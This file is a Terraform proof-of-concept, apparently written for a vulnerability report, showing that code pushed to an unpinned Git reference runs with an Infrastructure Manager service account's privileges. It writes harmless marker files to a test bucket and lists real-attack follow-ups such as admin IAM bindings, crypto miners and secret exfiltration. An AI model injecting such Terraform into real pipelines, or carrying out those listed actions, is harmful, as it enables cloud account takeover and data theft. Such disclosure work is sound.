# EVIL: Attacker-controlled Terraform
# This code was injected after maintainer review
# PR TOCTOU attack proof-of-concept

terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
  }
}

variable "project_id" {
  type    = string
  default = "ellison-hunt-1102-c86d"
}

# EVIL: Backdoor IAM binding (in real attack, this grants attacker access)
# For PoC, we just write a marker to prove code execution
resource "google_storage_bucket_object" "deployment_marker" {
  name    = "im-pr-toctou-test/deploy-marker.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = "EVIL_PR_TOCTOU_ATTACK_PROOF_${timestamp()}"
}

# EVIL: Exfiltration marker — proves attacker code ran with IM SA privileges
resource "google_storage_bucket_object" "evil_proof" {
  name    = "im-pr-toctou-test/EVIL-PROOF-ATTACKER-WAS-HERE.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = <<-EOT
  === INFRASTRUCTURE MANAGER PR TOCTOU PROOF ===
  Attack type: Git reference TOCTOU (no commit pinning)
  Timestamp: ${timestamp()}
  
  This file proves that an attacker who can push to a Git repository
  referenced by Infrastructure Manager can inject arbitrary Terraform
  code that executes with the IM Service Account's privileges.
  
  In a real attack, this Terraform could:
  1. Create IAM bindings granting attacker Organization Admin
  2. Open firewall rules
  3. Deploy crypto miners
  4. Exfiltrate secrets from Secret Manager
  5. Modify Cloud SQL databases
  EOT
}

output "deployment_status" {
  value = "EVIL_ATTACKER_CODE_EXECUTED"
}

output "attack_proof" {
  value = "PR_TOCTOU_GIT_REF_NOT_PINNED"
}
